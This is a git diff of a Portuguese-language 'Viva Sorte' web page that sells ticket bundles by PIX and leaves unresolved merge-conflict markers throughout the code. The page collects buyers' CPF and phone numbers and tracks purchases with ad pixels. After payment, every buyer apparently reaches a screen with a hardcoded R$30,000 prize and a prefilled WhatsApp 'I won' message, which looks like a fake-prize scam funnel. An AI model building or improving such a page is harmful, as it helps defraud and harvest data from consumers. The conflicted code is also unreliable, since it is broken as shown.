@@ -697,10 +697,13 @@
     .btn-suporte-final i {
         font-size: 18px;
     }
+<<<<<<< HEAD
 
     .btn-suporte-final i.bi-whatsapp {
         color: #25D366;
     }
+=======
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
     
     /* STYLES EXTRAS */
     .cota-selected {
@@ -1274,6 +1277,7 @@
     <!-- SCRIPTS -->
     <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
     
+<<<<<<< HEAD
     <!-- SCRIPT PRINCIPAL ATUALIZADO PARA VERCEL -->
     <script>
     // CONFIGURAÇÃO PARA VERCEL
@@ -1291,16 +1295,107 @@
     // FUNÇÃO PARA ABRIR SUPORTE NO WHATSAPP
     function abrirSuporteWhatsApp() {
         const whatsappLink = "https://wa.me/5521972493066?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Viva%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
+=======
+    <!-- SCRIPT PRINCIPAL COM VERIFICAÇÃO REAL DO PAGAMENTO E RASTREAMENTO DE CONVERSÃO -->
+    <script>
+    // VARIÁVEIS GLOBAIS
+    let pacoteSelecionado = {
+        quantidade: 6,
+        valor: 5.94
+    };
+    
+    let dadosUsuario = {
+        cpf: '',
+        telefone: '',
+        transactionId: '',
+        pixData: null
+    };
+
+    // CONFIGURAÇÃO ALLOW PAY
+    const ALLOWPAY_CONFIG = {
+        API_URL: 'api/allowpay.php',
+        CHECK_PAYMENT_URL: 'api/check-payment.php',
+        CHECK_CONFIRMED_URL: 'api/check-confirmed.php'
+    };
+
+    // VARIÁVEL PARA VERIFICAÇÃO AUTOMÁTICA
+    let verificacaoAutomatica = null;
+    let tentativasVerificacao = 0;
+
+    // FUNÇÃO PARA ENVIAR EVENTO DE CONVERSÃO PARA PIXEL
+    function enviarEventoConversao(valor, quantidade, transactionId) {
+        console.log('📊 Enviando evento de conversão para pixels');
+        
+        // UTMify Pixel - Se estiver usando UTMify
+        if (window.utmify && window.utmify.event) {
+            window.utmify.event('purchase', {
+                value: valor,
+                currency: 'BRL',
+                transaction_id: transactionId,
+                items: [{
+                    item_id: 'vivasorte_titulos',
+                    item_name: 'Títulos Viva Sorte',
+                    quantity: quantidade,
+                    price: valor / quantidade
+                }]
+            });
+            console.log('✅ Evento de conversão enviado para UTMify');
+        }
+        
+        // Facebook Pixel (se estiver usando)
+        if (typeof fbq !== 'undefined') {
+            fbq('track', 'Purchase', {
+                value: valor,
+                currency: 'BRL',
+                content_ids: ['vivasorte_titulos'],
+                content_name: 'Títulos Viva Sorte',
+                content_type: 'product',
+                num_items: quantidade
+            });
+            console.log('✅ Evento de conversão enviado para Facebook Pixel');
+        }
+        
+        // Salva no localStorage que a conversão foi rastreada
+        localStorage.setItem(`conversion_tracked_${transactionId}`, 'true');
+    }
+
+    // FUNÇÃO PARA ABRIR SUPORTE NO WHATSAPP (EM NOVA PÁGINA)
+    function abrirSuporteWhatsApp() {
+        // 🔧 CONFIGURE SEU LINK DO WHATSAPP AQUI 🔧
+        // Substitua pelo SEU número de WhatsApp
+        // Formato: https://wa.me/5521972493066?text=Mensagem%20pré-definida
+        const whatsappLink = "https://wa.me/5521972493066?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Viva%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
+        
+        // Abre em uma nova aba/página
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         window.open(whatsappLink, '_blank', 'noopener,noreferrer');
     }
 
     // FUNÇÃO PARA SELEÇÃO DE PACOTE
     function selecionarPacote(quantidade, valor) {
+<<<<<<< HEAD
         pacoteSelecionado = { quantidade: quantidade, valor: valor };
         document.getElementById('numero').value = quantidade;
         document.getElementById('btn-adicionar-carrinho').disabled = false;
         document.querySelectorAll('.cota').forEach(btn => btn.classList.remove('cota-selected'));
         event.currentTarget.classList.add('cota-selected');
+=======
+        console.log('Selecionando pacote:', quantidade, valor);
+        
+        pacoteSelecionado = {
+            quantidade: quantidade,
+            valor: valor
+        };
+        
+        document.getElementById('numero').value = quantidade;
+        document.getElementById('btn-adicionar-carrinho').disabled = false;
+        
+        document.querySelectorAll('.cota').forEach(btn => {
+            btn.classList.remove('cota-selected');
+        });
+        event.currentTarget.classList.add('cota-selected');
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         abrirModalPagamento();
     }
 
@@ -1308,6 +1403,10 @@
     function incrementar() {
         let input = document.getElementById('numero');
         let valor = parseInt(input.value) || 0;
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         if (valor < 200) {
             if (valor === 0) input.value = 6;
             else if (valor === 6) input.value = 10;
@@ -1319,12 +1418,20 @@
             else if (valor === 70) input.value = 100;
             else if (valor === 100) input.value = 200;
         }
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         atualizarBotaoComprar();
     }
 
     function decrementar() {
         let input = document.getElementById('numero');
         let valor = parseInt(input.value) || 0;
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         if (valor > 6) {
             if (valor === 200) input.value = 100;
             else if (valor === 100) input.value = 70;
@@ -1337,6 +1444,10 @@
         } else {
             input.value = 0;
         }
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         atualizarBotaoComprar();
     }
 
@@ -1344,10 +1455,21 @@
         let input = document.getElementById('numero');
         let valor = parseInt(input.value) || 0;
         let btn = document.getElementById('btn-adicionar-carrinho');
+<<<<<<< HEAD
         if (valor > 0) {
             btn.disabled = false;
             let valorTotal = (valor * 0.99).toFixed(2);
             pacoteSelecionado = { quantidade: valor, valor: parseFloat(valorTotal) };
+=======
+        
+        if (valor > 0) {
+            btn.disabled = false;
+            let valorTotal = (valor * 0.99).toFixed(2);
+            pacoteSelecionado = {
+                quantidade: valor,
+                valor: parseFloat(valorTotal)
+            };
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         } else {
             btn.disabled = true;
         }
@@ -1356,20 +1478,45 @@
     function comprarTitulosCustom() {
         let input = document.getElementById('numero');
         let quantidade = parseInt(input.value) || 0;
+<<<<<<< HEAD
         if (quantidade > 0) {
             let valorTotal = (quantidade * 0.99).toFixed(2);
             pacoteSelecionado = { quantidade: quantidade, valor: parseFloat(valorTotal) };
+=======
+        
+        if (quantidade > 0) {
+            let valorTotal = (quantidade * 0.99).toFixed(2);
+            pacoteSelecionado = {
+                quantidade: quantidade,
+                valor: parseFloat(valorTotal)
+            };
+            
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             abrirModalPagamento();
         }
     }
 
     // MODAL DE PAGAMENTO
     function abrirModalPagamento() {
+<<<<<<< HEAD
         atualizarResumoCompra();
         mostrarEtapa(1);
         document.getElementById('modalPagamento').style.display = 'flex';
         document.body.style.overflow = 'hidden';
         setTimeout(() => document.getElementById('inputCPF').focus(), 300);
+=======
+        console.log('Abrindo modal, pacote:', pacoteSelecionado);
+        
+        atualizarResumoCompra();
+        mostrarEtapa(1);
+        
+        document.getElementById('modalPagamento').style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        
+        setTimeout(() => {
+            document.getElementById('inputCPF').focus();
+        }, 300);
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
     }
 
     function fecharModal() {
@@ -1381,6 +1528,10 @@
     function atualizarResumoCompra() {
         document.getElementById('resumoCompra').textContent = 
             pacoteSelecionado.quantidade + ' títulos - R$' + pacoteSelecionado.valor.toFixed(2).replace('.', ',');
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         document.getElementById('quantidadeResumo').textContent = pacoteSelecionado.quantidade;
         document.getElementById('valorResumo').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
         document.getElementById('totalResumo').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
@@ -1388,7 +1539,14 @@
     }
 
     function mostrarEtapa(numeroEtapa) {
+<<<<<<< HEAD
         document.querySelectorAll('.etapa').forEach(etapa => etapa.classList.remove('ativa'));
+=======
+        document.querySelectorAll('.etapa').forEach(etapa => {
+            etapa.classList.remove('ativa');
+        });
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         document.getElementById('etapa' + numeroEtapa).classList.add('ativa');
         atualizarProgressoEtapas(numeroEtapa);
     }
@@ -1396,7 +1554,13 @@
     function atualizarProgressoEtapas(etapaAtual) {
         document.querySelectorAll('.etapa-item').forEach((item, index) => {
             item.classList.remove('ativa', 'completada');
+<<<<<<< HEAD
             const numeroItem = index + 1;
+=======
+            
+            const numeroItem = index + 1;
+            
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             if (numeroItem < etapaAtual) {
                 item.classList.add('completada');
                 item.querySelector('.etapa-numero').textContent = '✓';
@@ -1413,14 +1577,27 @@
 
     function formatarCPF(input) {
         let value = input.value.replace(/\D/g, '');
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         if (value.length <= 11) {
             value = value.replace(/(\d{3})(\d)/, '$1.$2');
             value = value.replace(/(\d{3})(\d)/, '$1.$2');
             value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
         }
+<<<<<<< HEAD
         input.value = value;
         const btn = document.getElementById('btnContinuarCPF');
         const cpfNumeros = value.replace(/\D/g, '');
+=======
+        
+        input.value = value;
+        
+        const btn = document.getElementById('btnContinuarCPF');
+        const cpfNumeros = value.replace(/\D/g, '');
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         if (cpfNumeros.length === 11) {
             btn.disabled = false;
             btn.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
@@ -1428,6 +1605,10 @@
             btn.disabled = true;
             btn.style.background = '#cccccc';
         }
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         document.getElementById('erroCPF').style.display = 'none';
         document.getElementById('sucessoCPF').style.display = 'none';
         input.style.borderColor = '#e0e0e0';
@@ -1435,6 +1616,7 @@
 
     function validarCPF(cpf) {
         cpf = cpf.replace(/\D/g, '');
+<<<<<<< HEAD
         if (cpf.length !== 11) return false;
         if (/^(\d)\1+$/.test(cpf)) return false;
         let soma = 0;
@@ -1446,6 +1628,28 @@
         for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
         resto = soma % 11;
         let digito2 = resto < 2 ? 0 : 11 - resto;
+=======
+        
+        if (cpf.length !== 11) return false;
+        if (/^(\d)\1+$/.test(cpf)) return false;
+        
+        let soma = 0;
+        for (let i = 0; i < 9; i++) {
+            soma += parseInt(cpf.charAt(i)) * (10 - i);
+        }
+        let resto = soma % 11;
+        let digito1 = resto < 2 ? 0 : 11 - resto;
+        
+        if (digito1 !== parseInt(cpf.charAt(9))) return false;
+        
+        soma = 0;
+        for (let i = 0; i < 10; i++) {
+            soma += parseInt(cpf.charAt(i)) * (11 - i);
+        }
+        resto = soma % 11;
+        let digito2 = resto < 2 ? 0 : 11 - resto;
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         return digito2 === parseInt(cpf.charAt(10));
     }
 
@@ -1477,9 +1681,17 @@
         }
         
         dadosUsuario.cpf = cpfNumeros;
+<<<<<<< HEAD
         cpfInput.style.borderColor = '#28a745';
         sucessoCPF.style.display = 'block';
         cpfExibido.textContent = cpf;
+=======
+        
+        cpfInput.style.borderColor = '#28a745';
+        sucessoCPF.style.display = 'block';
+        cpfExibido.textContent = cpf;
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         const btnContinuar = document.getElementById('btnContinuarCPF');
         btnContinuar.style.display = 'none';
         
@@ -1496,7 +1708,15 @@
 
     function formatarTelefone(input) {
         let value = input.value.replace(/\D/g, '');
+<<<<<<< HEAD
         if (value.length > 11) value = value.substring(0, 11);
+=======
+        
+        if (value.length > 11) {
+            value = value.substring(0, 11);
+        }
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         if (value.length > 10) {
             value = value.replace(/(\d{2})(\d)/, '($1) $2');
             value = value.replace(/(\d{5})(\d)/, '$1-$2');
@@ -1506,7 +1726,13 @@
         } else if (value.length > 2) {
             value = value.replace(/(\d{2})(\d)/, '($1) $2');
         }
+<<<<<<< HEAD
         input.value = value;
+=======
+        
+        input.value = value;
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         document.getElementById('erroTelefone').style.display = 'none';
         input.style.borderColor = '#e0e0e0';
     }
@@ -1548,6 +1774,7 @@
                 nome: `Cliente ${dadosUsuario.cpf.substring(0, 3)}***`
             };
             
+<<<<<<< HEAD
             console.log('📤 Enviando para API Vercel:', dadosPIX);
             
             const response = await fetch(VERCEL_CONFIG.API_URL, {
@@ -1560,29 +1787,68 @@
             
             const resultado = await response.json();
             console.log('📥 Resposta API:', resultado);
+=======
+            console.log('📤 Enviando para Allow Pay:', dadosPIX);
+            
+            const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(dadosPIX)
+            });
+            
+            const resultado = await response.json();
+            console.log('📥 Resposta Allow Pay:', resultado);
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             
             if (!resultado.success) {
                 throw new Error(resultado.error || 'Erro ao gerar PIX');
             }
             
+<<<<<<< HEAD
             // Exibir QR Code
             const qrCodeImage = resultado.qr_code_image || 
                 `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix)}`;
+=======
+            const qrCodeImage = resultado.qr_code_image || 
+                `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix || resultado.qr_code)}`;
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             
             document.getElementById('qrCodeImage').innerHTML = 
                 `<img src="${qrCodeImage}" alt="QR Code PIX" style="max-width: 200px; border: 1px solid #ddd;">`;
             
+<<<<<<< HEAD
             document.getElementById('codigoPIX').value = resultado.codigo_pix;
             document.getElementById('areaPIX').style.display = 'block';
             btnGerarPIX.style.display = 'none';
             document.getElementById('aguardandoConfirmacao').style.display = 'block';
             
             dadosUsuario.transactionId = resultado.transaction_id;
+=======
+            document.getElementById('codigoPIX').value = resultado.codigo_pix || resultado.qr_code;
+            
+            document.getElementById('areaPIX').style.display = 'block';
+            
+            btnGerarPIX.style.display = 'none';
+            
+            document.getElementById('aguardandoConfirmacao').style.display = 'block';
+            
+            dadosUsuario.transactionId = resultado.transaction_id;
+            dadosUsuario.pixData = resultado;
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             
             localStorage.setItem(`pix_vs_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
                 telefone: dadosUsuario.telefone,
+<<<<<<< HEAD
+=======
+                quantidade: pacoteSelecionado.quantidade,
+                valor: pacoteSelecionado.valor,
+                gerado_em: new Date().toISOString(),
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
                 status: 'pending'
             }));
             
@@ -1599,7 +1865,11 @@
             
             btnGerarPIX.innerHTML = 'Gerar PIX para pagamento';
             btnGerarPIX.disabled = false;
+<<<<<<< HEAD
             btnGerarPIX.style.display = 'block';
+=======
+            btnGerarPIX.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             
             mostrarPopupNotificacao('Erro ao gerar PIX. Tente novamente.', true);
         }
@@ -1607,6 +1877,10 @@
 
     function copiarCodigoPIX() {
         const codigoInput = document.getElementById('codigoPIX');
+<<<<<<< HEAD
+=======
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         if (!codigoInput.value) {
             alert('Nenhum código PIX disponível para copiar.');
             return;
@@ -1616,6 +1890,7 @@
         codigoInput.setSelectionRange(0, 99999);
         
         navigator.clipboard.writeText(codigoInput.value)
+<<<<<<< HEAD
             .then(() => mostrarPopupNotificacao('✅ Código PIX copiado!'))
             .catch(err => alert('Falha ao copiar. Selecione e copie manualmente.'));
     }
@@ -1629,10 +1904,41 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ transaction_id: dadosUsuario.transactionId })
+=======
+            .then(() => {
+                mostrarPopupNotificacao('✅ Código PIX copiado para a área de transferência!');
+            })
+            .catch(err => {
+                console.error('Erro ao copiar: ', err);
+                alert('Falha ao copiar. Selecione e copie manualmente.');
+            });
+    }
+
+    // FUNÇÃO PARA VERIFICAR NA ALLOW PAY
+    async function verificarPagamentoAutomatico() {
+        if (!dadosUsuario.transactionId) {
+            console.log('❌ Nenhuma transação para verificar');
+            return;
+        }
+        
+        tentativasVerificacao++;
+        document.getElementById('statusAguardando').textContent = `Verificando pagamento...`;
+        
+        try {
+            const response = await fetch(ALLOWPAY_CONFIG.CHECK_PAYMENT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    transaction_id: dadosUsuario.transactionId
+                })
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             });
             
             const result = await response.json();
             
+<<<<<<< HEAD
             if (result.success && result.status === 'paid') {
                 console.log('✅ Pagamento confirmado!');
                 pararVerificacaoAutomatica();
@@ -1644,20 +1950,78 @@
             
         } catch (error) {
             console.error('💥 Erro na verificação:', error);
+=======
+            if (!result.success) {
+                console.log('❌ Erro na verificação:', result.error);
+                return;
+            }
+            
+            const status = result.status;
+            const allowpayStatus = result.allowpay_status;
+            
+            console.log(`📊 Status do pagamento: ${allowpayStatus}`);
+            
+            const statusConfirmados = ['paid', 'completed', 'approved'];
+            
+            if (statusConfirmados.includes(status)) {
+                console.log('✅ Pagamento confirmado automaticamente!');
+                
+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #28a745;">✅ Pagamento confirmado! Redirecionando...</span>';
+                
+                pararVerificacaoAutomatica();
+                
+                processarConfirmacao({
+                    confirmado: true,
+                    status: status,
+                    allowpay_status: allowpayStatus,
+                    amount: result.amount,
+                    data: result.response_data
+                });
+                
+            } else if (status === 'expired') {
+                console.log('❌ PIX expirado');
+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #e74c3c;">❌ Este PIX expirou. Gere um novo código.</span>';
+                pararVerificacaoAutomatica();
+                
+            } else if (status === 'failed' || status === 'canceled') {
+                console.log('❌ Pagamento falhou ou foi cancelado');
+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #e74c3c;">❌ Pagamento falhou ou foi cancelado.</span>';
+                pararVerificacaoAutomatica();
+                
+            } else {
+                document.getElementById('statusAguardando').textContent = `Aguardando confirmação...`;
+            }
+            
+        } catch (error) {
+            console.error('💥 Erro na verificação automática:', error);
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             document.getElementById('statusAguardando').textContent = `Erro na verificação. Tentando novamente...`;
         }
     }
 
     function iniciarVerificacaoAutomatica() {
+<<<<<<< HEAD
         console.log('🔄 Iniciando verificação automática');
         verificarPagamentoAutomatico();
+=======
+        console.log('🔄 Iniciando verificação automática a cada 5 segundos');
+        
+        tentativasVerificacao = 0;
+        
+        verificarPagamentoAutomatico();
+        
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         verificacaoAutomatica = setInterval(verificarPagamentoAutomatico, 5000);
         
         setTimeout(() => {
             if (verificacaoAutomatica) {
                 pararVerificacaoAutomatica();
+<<<<<<< HEAD
                 document.getElementById('statusAguardando').innerHTML = 
                     '<span style="color: #e74c3c;">⏰ Tempo esgotado. Se já pagou, contate o suporte.</span>';
+=======
+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #e74c3c;">⏰ Tempo de verificação esgotado. Se já pagou, contate o suporte.</span>';
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             }
         }, 1800000);
     }
@@ -1666,6 +2030,7 @@
         if (verificacaoAutomatica) {
             clearInterval(verificacaoAutomatica);
             verificacaoAutomatica = null;
+<<<<<<< HEAD
         }
     }
 
@@ -1697,11 +2062,63 @@
         mostrarPopupNotificacao('✅ Pagamento confirmado! Redirecionando...');
         
         setTimeout(() => mostrarEtapa(3), 2000);
+=======
+            console.log('⏹️ Verificação automática parada');
+        }
+    }
+
+    function processarConfirmacao(dadosConfirmacao) {
+        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_vs_${dadosUsuario.transactionId}`) || '{}');
+        transacaoSalva.status = 'paid';
+        transacaoSalva.confirmado_em = new Date().toISOString();
+        transacaoSalva.confirmacao_dados = dadosConfirmacao;
+        localStorage.setItem(`pix_vs_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
+        
+        salvarConfirmacaoPagamento();
+        
+        // ENVIAR EVENTO DE CONVERSÃO PARA PIXELS
+        enviarEventoConversao(pacoteSelecionado.valor, pacoteSelecionado.quantidade, dadosUsuario.transactionId);
+        
+        document.getElementById('transacaoId').textContent = dadosUsuario.transactionId;
+        
+        mostrarPopupNotificacao('✅ Pagamento confirmado! Redirecionando...');
+        
+        setTimeout(() => {
+            mostrarEtapa(3);
+        }, 2000);
+    }
+
+    function salvarConfirmacaoPagamento() {
+        const transacao = {
+            id: dadosUsuario.transactionId,
+            cpf: dadosUsuario.cpf,
+            telefone: dadosUsuario.telefone,
+            quantidade: pacoteSelecionado.quantidade,
+            valor: pacoteSelecionado.valor,
+            data: new Date().toISOString(),
+            status: 'pago',
+            confirmado_em: new Date().toISOString()
+        };
+        
+        let transacoes = JSON.parse(localStorage.getItem('vivasorte_transacoes') || '[]');
+        transacoes.push(transacao);
+        localStorage.setItem('vivasorte_transacoes', JSON.stringify(transacoes));
+        
+        console.log('✅ Pagamento confirmado salvo:', transacao);
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
     }
 
     // ETAPA 3: CONFIRMAÇÃO PARA PRÊMIO
     function avancarParaEtapa4() {
         mostrarEtapa(4);
+<<<<<<< HEAD
+=======
+        
+        salvarVisualizacaoPremio();
+    }
+
+    function salvarVisualizacaoPremio() {
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         const transacao = {
             id: dadosUsuario.transactionId,
             cpf: dadosUsuario.cpf,
@@ -1709,21 +2126,39 @@
             valor_premio: 30000,
             visto_em: new Date().toISOString()
         };
+<<<<<<< HEAD
         console.log('🏆 Prêmio visualizado:', transacao);
     }
 
     // FUNÇÕES AUXILIARES
+=======
+        
+        console.log('🏆 Prêmio visualizado:', transacao);
+    }
+
+    // FUNÇÕES AUXILIARES - CORRIGIDO
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
     function mostrarPopupNotificacao(mensagem, isError = false) {
         const popup = document.getElementById('popup');
         popup.textContent = mensagem;
         popup.style.background = isError ? '#e74c3c' : '#28a745';
+<<<<<<< HEAD
         popup.style.display = 'block';
+=======
+        popup.style.display = 'block'; // CORREÇÃO: ASPAS ADICIONADAS
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         
         if (document.getElementById('notifySound')) {
             document.getElementById('notifySound').play().catch(e => console.log('Som não disponível'));
         }
         
+<<<<<<< HEAD
         setTimeout(() => popup.style.display = 'none', 4000);
+=======
+        setTimeout(() => {
+            popup.style.display = 'none';
+        }, 4000);
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
     }
 
     // INICIALIZAÇÃO
@@ -1736,18 +2171,36 @@
         });
         
         document.getElementById('modalPagamento').addEventListener('click', function(e) {
+<<<<<<< HEAD
             if (e.target === this) fecharModal();
+=======
+            if (e.target === this) {
+                fecharModal();
+            }
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         });
         
         document.getElementById('inputCPF').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 const btn = document.getElementById('btnContinuarCPF');
+<<<<<<< HEAD
                 if (!btn.disabled) validarCPFeAvancar();
+=======
+                if (!btn.disabled) {
+                    validarCPFeAvancar();
+                }
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             }
         });
         
         document.getElementById('inputTelefone').addEventListener('keypress', function(e) {
+<<<<<<< HEAD
             if (e.key === 'Enter') gerarPIX();
+=======
+            if (e.key === 'Enter') {
+                gerarPIX();
+            }
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         });
         
         iniciarPopups();
@@ -1769,6 +2222,7 @@
         ];
 
         let index = 0;
+<<<<<<< HEAD
         function mostrarPopup() {
             if (index >= mensagens.length) return;
             const popup = document.getElementById('popup');
@@ -1777,12 +2231,30 @@
             if (document.getElementById('notifySound')) {
                 document.getElementById('notifySound').play().catch(e => console.log('Som não disponível'));
             }
+=======
+
+        function mostrarPopup() {
+            if (index >= mensagens.length) return;
+
+            const popup = document.getElementById('popup');
+            popup.innerText = mensagens[index];
+            popup.style.display = 'block';
+            
+            if (document.getElementById('notifySound')) {
+                document.getElementById('notifySound').play().catch(e => console.log('Som não disponível'));
+            }
+
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
             setTimeout(() => {
                 popup.style.display = 'none';
                 index++;
                 setTimeout(mostrarPopup, 5000);
             }, 4000);
         }
+<<<<<<< HEAD
+=======
+
+>>>>>>> ccdf8699baf48058b65860b6b263e5fa7f4c4ae5
         setTimeout(mostrarPopup, 1000);
     }
     </script>
